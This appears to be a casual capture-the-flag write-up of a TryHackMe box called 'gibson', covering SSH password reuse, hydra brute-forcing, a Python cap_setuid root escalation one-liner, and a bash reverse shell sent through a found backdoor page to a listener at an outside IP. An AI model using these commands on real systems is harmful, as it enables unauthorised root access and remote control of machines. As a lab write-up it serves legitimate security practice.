- the hydra for gcrawford was taking way too long and turned out i didnt need it in the end.
- logged into ftp as campbell and got another flag

- since there was two users provided and 3 ssh accounts open i figured theres 1 root and the 2 we found so i tried the same password for ssh and it worked.
```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# ssh rcampbell@10.10.167.61

rcampbell@gibson:~$ ls

```
- check for SUID's, /etc/sudoers, etc. nothing, but getcaps gives us this:
```bash
/usr/bin/python3.6 = cap_setuid+ep
/usr/bin/python3.6m = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```
- exploit:
```python
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```
- and like that we got root now we hunt for flags and secure the king.txt
```bash
root@gibson:~# whoami
root
```
![](https://media.tenor.com/myX9wL2rQkEAAAAC/tower-of-god-tog.gif))
- regular flag and user .txt didnt find anything so i used the hint we gained earlier about the hidden files
```bash
root@gibson:/root# find / -name flag.txt 2>/dev/null
root@gibson:/root# find / -name user.txt 2>/dev/null
root@gibson:/root# find / -name .flag  2>/dev/null
/root/.flag
/home/tryhackme/.flag
/home/production/.flag
/home/rcampbell/.flag
/var/ftp/.flag
```
- the box said it had 9 flags and we only found 5 now so i tried *.txt as well and found bussiness.txt
```bash
/home/gcrawford/business.txt
```
- after traversing throught the system with no luck finding the flag i tried surfing the http website, trying exiftool on the pictures and going through the source code and dirbuster. I found http://10.10.167.61/backdoor/ and http://10.10.167.61/backdoor/shell/ pretty sus if you ask me. I tried loging in with the ftp and ssh user-pass combos first but it didnt work. The error kept giving me an annoying js alert popup. So i pulled up hydra again.

- there were multiple hints throughout the robots.txt and an html comment with a bolded **PLAGUE** so i tried it for the user.
- after i got in i ls and figure out its the /production directory we already pwned through ssh. Out of boredom i just did a thrash bash revshell with a nc listening on port 6969
- 
```bash
    
=============================
=    daPlague's backdoor    =
=     Skiddies Keep Out     =
=============================
plague@gibson:$ ls
resources
server
plague@gibson:$ bash -i >& /dev/tcp/10.10.149.220/6969 0>&1

```
-and we got a thrash revshell woohoo! we already pwned the box so i wasnt looking at pwning it from here ( i was lookking for flags ), but i checked for possible entries anyways in case i needed to patch something
```bash
production@gibson:~/webserver$ sudo abilities
sudo abilities
sudo: no tty present and no askpass program specified
production@gibson:~/webserver$ sudo -l
sudo -l
Matching Defaults entries for production on gibson:
    env_reset, pwfeedback, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User production may run the following commands on gibson:
    (root) NOPASSWD: /usr/bin/openssl
```
-so you can definetly pwn it through here exploiting openssl, but there was 15 minutes left and i already pwned it so i didnt bother ( this time )

# Conclusion
- this was a fun box i got 6/9 flags + firstblood and king pwn which is solid considering this was my first play on this machine. Just wish my hydra worked faster cause i feel like i got the more op accounts pass before the lower tier one that had ssh keys in his account.
- overall really fun machine. Personal rating 8/10 !!!
- il definetly play again and try to find the remaining 3 flags !
